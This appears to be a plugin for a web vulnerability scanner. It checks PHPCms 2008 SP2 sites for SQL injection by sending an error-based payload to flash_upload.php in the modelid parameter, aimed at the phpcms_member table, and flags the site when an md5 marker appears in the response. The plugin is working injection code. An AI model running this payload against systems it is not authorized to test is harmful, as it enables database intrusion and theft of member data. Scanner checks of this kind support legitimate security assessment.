#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "flash_upload.php?modelid=1%20and%20%28select%201%20from%28select%20count%28*%29,concat%280x7c,%28select%20concat%280x7c,md5(333333)%29%20from%20phpcms_member%20limit%200,1%29,0x7c,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1%29a%29%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('1a100d2c0dab19c4430e7d73762b3423')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:PHPCms2008sp2Sqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PHPCms2008sp2Sqlinjection.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def